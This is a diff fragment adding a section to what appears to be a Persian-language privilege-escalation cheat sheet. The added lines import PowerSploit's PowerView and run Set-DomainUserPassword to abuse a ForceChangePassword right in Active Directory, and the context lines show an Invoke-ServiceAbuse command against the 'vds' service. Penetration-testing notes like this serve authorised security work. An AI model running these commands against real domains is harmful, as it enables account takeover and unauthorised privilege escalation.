@@ -505,6 +505,14 @@ SECOND:
 Invoke-ServiceAbuse -Name ‘vds’ -UserName ‘domain\user1’
 ```
 
+### ارتقا دسترسی با ForceChangePassword
+
+```text
+https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
+Import-Module .\PowerView_dev.ps1
+Set-DomainUserPassword -Identity user1 -verbose
+```
+
 ### ارتقا دسترسی با gdbus
 
 ```text
